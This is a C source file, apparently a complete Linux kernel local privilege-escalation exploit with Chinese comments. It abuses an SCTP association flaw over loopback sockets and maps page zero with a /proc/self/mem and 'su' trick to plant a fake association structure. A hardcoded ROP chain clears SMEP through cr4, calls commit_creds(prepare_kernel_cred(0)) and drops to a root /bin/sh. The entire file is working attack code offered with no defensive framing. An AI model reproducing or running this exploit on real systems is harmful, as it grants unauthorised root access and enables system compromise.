#define _GNU_SOURE 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <fcntl.h> 
#include <string.h> 
#include <arpa/inet.h> 
#include <pthread.h> 
#include <error.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/sctp.h>
#include <netinet/in.h> 
#include <time.h> 
#include <malloc.h> 
#include <sys/mman.h> 
#include <err.h> 
#include <signal.h> 
#define SERVER_PORT 6666 
#define SCTP_GET_ASSOC_ID_LIST 29 
#define SCTP_RESET_ASSOC 120 
#define SCTP_ENABLE_RESET_ASSOC_REQ 0x02 
#define SCTP_ENABLE_STREAM_RESET 118 
unsigned int user_cs, user_ss, user_rflags, user_sp;

#define KERNCALL __attribute__((regparm(3))) 
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1074a20;
void (*commit_creds)(void*) KERNCALL = (void*) 0xc1074670;

struct sock{
	char padding1[0x24];
	void *net;
	char padding2[0x278];
	int type;
};


struct sctp_association{
	char padding1[0x18];
	struct sock *sk;
	char padding2[0x190];
	int state;
};


void save_status()
{
    asm("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %esp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get(){

    commit_creds(prepare_kernel_cred(0));
	asm(
		"pushl user_ss;"
		"pushl user_sp;"
		"pushl user_rflags;"
		"pushl user_cs;"
		"push $shell;"
		"iret;");
}

void shell(){
    system("/bin/sh");
    printf("getshell!");
}

void* client_func(void* arg)
{
	int socket_fd;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;
	struct sctp_sndrcvinfo sri;
	int s;

	char sendline[] = "butterfly";

	if ((socket_fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP))==-1){
		perror("client socket");
		pthread_exit(0);
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(socket_fd,IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_))==-1){
		perror("client setsockopt");
		goto client_out_;
	}

	sri.sinfo_ppid = 0;
	sri.sinfo_flags = 0;
	printf("sctp_sendmsg\n");
	if(sctp_sendmsg(socket_fd,sendline,sizeof(sendline),
		(struct sockaddr*)&serverAddr,sizeof(serverAddr),
		sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream,0,0)==-1){
		perror("client sctp_sendmsg");
		goto client_out_;
	}

client_out_:
  	//close(socket_fd);
	pthread_exit(0);
}

void* send_recv(void* arg)
{
	int server_sockfd, msg_flags;
	server_sockfd = *(int*)arg;
	socklen_t len = sizeof(struct sockaddr_in);
	size_t rd_sz;
	char readbuf[20]="0";
	struct sctp_sndrcvinfo sri;
	struct sockaddr_in clientAddr;
	
	rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),
	(struct sockaddr*)&clientAddr, &len, &sri, &msg_flags);
	
	sri.sinfo_flags = (1 << 6) | (1 << 2);
	printf("SENDALL.\n");
	if(sctp_sendmsg(server_sockfd,readbuf,0,(struct sockaddr*)&clientAddr,
		len,sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream, 0,0)<0){
		perror("SENDALL sendmsg");
	}
	pthread_exit(0);
}

void setpayload(){
	unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	if (addr != 0x10000)
			err(2,"mmap failed");
	int fd = open("/proc/self/mem",O_RDWR);
	if (fd == -1)
			err(2,"open mem failed");
	char cmd[0x100] = {0};
	sprintf(cmd, "su >&%d < /dev/null", fd);
	while (addr)
	{
			addr -= 0x1000;
			if (lseek(fd, addr, SEEK_SET) == -1)
					err(2, "lseek failed");
			system(cmd);
	}
	printf("contents:%s\n",(char *)1);
    
	struct sctp_association *asoc = (struct sctp_association *)0xbc;
	asoc->sk = (struct sock *)0x1000;
	asoc->sk->type = 1;
	asoc->state = 0x7caf02c;
	unsigned int* call = (unsigned int *)0x3000;
	call[0] = 0xc1743d8f;	//mov esp, dword ptr [ebx + eax]; add byte ptr [eax], al; add bl, byte ptr [ebx + 0x5d]; ret;
	unsigned int *rop = (unsigned int *)0;
	rop[0] = 0x50;
	rop[20] = 0xc1022751; //pop eax;ret;
	rop[21] = 0x6d0;
	rop[22] = 0xc1022a69; //mov cr4, eax; push ecx; popfd; xor eax, eax; ret;
	rop[23] = 0xc1000324; //pop ebp;ret
	rop[24] = 0x4000;
	rop[25] = 0xc1022751; //pop eax;ret;
	rop[26] = 0xc71a5be0;
	rop[27] = 0xc124efdd; //mov esp, eax; call dword ptr [ebp - 0x77];
	unsigned int *tmp = (unsigned int *)(0x4000-0x77);
	tmp[0] = &get;

}


int main(int argc, char** argv)
{
	save_status();
	int server_sockfd;
	//int messageFlags_;
	pthread_t thread_array[2];
	pthread_t close_thread;
	pthread_t send_recv_thread;
	int i;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;
	setpayload();
	//创建服务端SCTP套接字
	if ((server_sockfd = socket(AF_INET,SOCK_SEQPACKET,IPPROTO_SCTP))==-1){
		perror("socket");
		return 0;
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	//地址绑定
	if(bind(server_sockfd, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) == -1){
		perror("bind");
		goto out_;
	}

	//设置SCTP通知事件
	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(server_sockfd, IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_)) == -1){
		perror("setsockopt");
		goto out_;
	}

	//开始监听
	listen(server_sockfd,100);
	//创建线程，用于客户端链接
	for(i=0; i<2;i++) {
		printf("create no.%d\n",i+1);
		if(pthread_create(&thread_array[i],NULL,client_func,NULL)){
			perror("pthread_create");
			goto out_;
		}
	}
	//创建接收线程
	if(pthread_create(&send_recv_thread,NULL,send_recv,(void*)&server_sockfd)){
			perror("pthread_create");
			goto out_;
	}
	while(1);
out_:
	close(server_sockfd);
	return 0;
}